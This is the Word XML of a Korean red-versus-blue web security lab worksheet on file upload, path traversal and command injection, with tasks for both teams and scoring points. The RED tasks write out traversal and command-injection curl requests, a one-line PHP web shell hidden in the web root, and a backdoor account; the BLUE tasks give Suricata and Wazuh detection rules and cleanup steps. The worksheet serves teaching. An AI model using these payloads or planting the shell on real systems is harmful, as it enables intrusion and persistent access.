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맑은 고딕" w:hAnsi="맑은 고딕" w:eastAsia="맑은 고딕"/>
        </w:rPr>
        <w:t>[웹취약점 W7] 파일 업로드/경로순회/명령주입 — RCE 발판 vs 입력검증 방어</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:hAnsi="맑은 고딕" w:eastAsia="맑은 고딕"/>
          <w:i/>
          <w:color w:val="666666"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>카테고리 web-vuln  ·  난이도 medium  ·  유형 1v1  ·  제한 45분</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:hAnsi="맑은 고딕" w:eastAsia="맑은 고딕"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>이름: __________________    학번: __________________    날짜: __________________</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:hAnsi="맑은 고딕" w:eastAsia="맑은 고딕"/>
          <w:b/>
          <w:sz w:val="26"/>
        </w:rPr>
        <w:t>■ 시나리오 개요</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:hAnsi="맑은 고딕" w:eastAsia="맑은 고딕"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve">웹취약점 점검 7주차 — </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:hAnsi="맑은 고딕" w:eastAsia="맑은 고딕"/>
          <w:b/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>파일 업로드 / 경로 순회 / 명령어 주입</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:hAnsi="맑은 고딕" w:eastAsia="맑은 고딕"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>. 셋 다 RCE 로 이어지는 고위험 취약점이다.</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:hAnsi="맑은 고딕" w:eastAsia="맑은 고딕"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>공격자는 웹쉘 업로드·트래버설·명령주입으로 발판을 얻고, 점검자(너)는 입력 검증·탐지로 방어한다.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:hAnsi="맑은 고딕" w:eastAsia="맑은 고딕"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve">▸ 이야기: 공격자가 웹쉘을 업로드하고(태그 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>wv07r1</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:hAnsi="맑은 고딕" w:eastAsia="맑은 고딕"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>) 웹쉘(</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>/var/www/html/.wv07shell.php</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:hAnsi="맑은 고딕" w:eastAsia="맑은 고딕"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve">)과 계정 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>wva07</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:hAnsi="맑은 고딕" w:eastAsia="맑은 고딕"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> 을 남긴다.</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:hAnsi="맑은 고딕" w:eastAsia="맑은 고딕"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>점검자는 ① 업로드/트래버설 탐지, ② 웹쉘 Wazuh 룰, ③ 입력검증 점검·R/B/P 로 대응한다.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:hAnsi="맑은 고딕" w:eastAsia="맑은 고딕"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>▸ 모드: solo/duel. 공격자=외부 공격자 VM(192.168.0.202)(192.168.0.202), Red 채점=대상 흔적(WAF audit 태그/웹쉘·계정).</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:hAnsi="맑은 고딕" w:eastAsia="맑은 고딕"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve">▸ 마커: 태그 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:hAnsi="맑은 고딕" w:eastAsia="맑은 고딕"/>
          <w:b/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>`wv07r1-&lt;본인id&gt;`</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:hAnsi="맑은 고딕" w:eastAsia="맑은 고딕"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve">, 웹쉘 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:hAnsi="맑은 고딕" w:eastAsia="맑은 고딕"/>
          <w:b/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>`/var/www/html/.wv07shell.php`</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:hAnsi="맑은 고딕" w:eastAsia="맑은 고딕"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve">(마커 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>wv07</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:hAnsi="맑은 고딕" w:eastAsia="맑은 고딕"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve">), 계정 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:hAnsi="맑은 고딕" w:eastAsia="맑은 고딕"/>
          <w:b/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>`wva07`</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:hAnsi="맑은 고딕" w:eastAsia="맑은 고딕"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>,</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:hAnsi="맑은 고딕" w:eastAsia="맑은 고딕"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve">Suricata </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:hAnsi="맑은 고딕" w:eastAsia="맑은 고딕"/>
          <w:b/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>sid 9907011</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:hAnsi="맑은 고딕" w:eastAsia="맑은 고딕"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve">, Wazuh </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:hAnsi="맑은 고딕" w:eastAsia="맑은 고딕"/>
          <w:b/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>id 105071</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:hAnsi="맑은 고딕" w:eastAsia="맑은 고딕"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>. 종료 시 cleanup.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:hAnsi="맑은 고딕" w:eastAsia="맑은 고딕"/>
          <w:b/>
          <w:color w:val="C00000"/>
          <w:sz w:val="30"/>
        </w:rPr>
        <w:t>🔴 RED #1   (배점 22점  ·  대상 VM: web)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🎯 RED-1 [업로드/트래버설/명령주입] — RCE 시도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 (외부 공격자 VM 192.168.0.202)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:shd w:val="clear" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>curl -s -H "Host: mediforum.el34.lab" "http://192.168.0.161/api/debug/echo?file=wv07r1-kim/../../../../etc/passwd"</w:t>
        <w:br/>
        <w:t>curl -s -H "Host: mediforum.el34.lab" "http://192.168.0.161/api/debug/echo?ip=127.0.0.1;id%23wv07r1-kim&amp;Submit=Submit"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 / 합격 기준</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:hAnsi="맑은 고딕" w:eastAsia="맑은 고딕"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve">대상 WAF audit 에 태그 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>wv07r1</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:hAnsi="맑은 고딕" w:eastAsia="맑은 고딕"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> 흔적 시 인정.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C00000"/>
          <w:sz w:val="30"/>
        </w:rPr>
        <w:t>🔴 RED #2   (배점 18점  ·  대상 VM: web)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🎯 RED-2 [웹쉘 업로드] — PHP 웹쉘 + 계정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pPr>
        <w:shd w:val="clear" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>cat &gt; /var/www/html/.wv07shell.php &lt;&lt;'PHP'</w:t>
        <w:br/>
        <w:t>&lt;?php /* wv07 */ system($_POST['c'] ?? ''); ?&gt;</w:t>
        <w:br/>
        <w:t>PHP</w:t>
        <w:br/>
        <w:t>sudo useradd -m -s /bin/bash wva07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 / 합격 기준</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>/var/www/html/.wv07shell.php</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:hAnsi="맑은 고딕" w:eastAsia="맑은 고딕"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve">(마커 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>wv07</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:hAnsi="맑은 고딕" w:eastAsia="맑은 고딕"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve">) 또는 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>wva07</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:hAnsi="맑은 고딕" w:eastAsia="맑은 고딕"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> 존재 시 인정.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#1   (배점 20점  ·  대상 VM: ips)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BLUE-1 [트래버설/명령주입 탐지] — Suricata 룰 (sid 9907011)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pPr>
        <w:shd w:val="clear" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>alert http any any -&gt; any any (msg:"WEBVULN-W07 path traversal / command injection"; flow:to_server; http.uri; content:"../"; nocase; sid:9907011; rev:1;)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:shd w:val="clear" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>sudo suricatasc -c reload-rules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 / 합격 기준</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:hAnsi="맑은 고딕" w:eastAsia="맑은 고딕"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve">ips 의 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>local.rules</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:hAnsi="맑은 고딕" w:eastAsia="맑은 고딕"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> 에 sid 9907011 룰 존재 시 인정.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#2   (배점 20점  ·  대상 VM: siem)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BLUE-2 [웹쉘 탐지] — Wazuh 룰 (id 105071)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pPr>
        <w:shd w:val="clear" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>&lt;group name="edu,webvuln,"&gt;</w:t>
        <w:br/>
        <w:t xml:space="preserve">  &lt;rule id="105071" level="13"&gt;</w:t>
        <w:br/>
        <w:t xml:space="preserve">    &lt;if_group&gt;edu&lt;/if_group&gt;</w:t>
        <w:br/>
        <w:t xml:space="preserve">    &lt;match&gt;wva07&lt;/match&gt;</w:t>
        <w:br/>
        <w:t xml:space="preserve">    &lt;description&gt;WEBVULN-W07 - web shell upload / RCE account&lt;/description&gt;</w:t>
        <w:br/>
        <w:t xml:space="preserve">  &lt;/rule&gt;</w:t>
        <w:br/>
        <w:t>&lt;/group&gt;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:shd w:val="clear" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>sudo /var/ossec/bin/wazuh-control restart</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:hAnsi="맑은 고딕" w:eastAsia="맑은 고딕"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve">또한 웹쉘 헌팅: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>find /var/www -name '.*.php' -mmin -120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 / 합격 기준</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>local_rules.xml</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:hAnsi="맑은 고딕" w:eastAsia="맑은 고딕"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> 에 id 105071 룰 존재 시 인정.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#3   (배점 18점  ·  대상 VM: siem)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BLUE-3 [입력검증 점검·R/B/P]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r>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:hAnsi="맑은 고딕" w:eastAsia="맑은 고딕"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>보고서에: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업로드 검증(확장자/MIME/매직바이트/저장 위치 분리) + 트래버설 방어(정규화/화이트리스트) + 명령주입 방어(인자 분리) 점검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R/B/P 회고 + 웹쉘(</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>/var/www/html/.wv07shell.php</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:hAnsi="맑은 고딕" w:eastAsia="맑은 고딕"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>)·계정(wva07) 헌팅·삭제</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:shd w:val="clear" w:fill="F2F2F2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>sudo tail -200 /var/ossec/logs/alerts/alerts.json | \</w:t>
        <w:br/>
        <w:t xml:space="preserve">  python3 -c 'import sys,json;[print(json.loads(l).get("rule",{}).get("id")) for l in sys.stdin if l.strip()]' | sort | uniq -c | sort -rn | head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 / 합격 기준</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:hAnsi="맑은 고딕" w:eastAsia="맑은 고딕"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>본인 SIEM 에 최근 경보 + 제출한 입력검증 점검·R/B/P 로 인정.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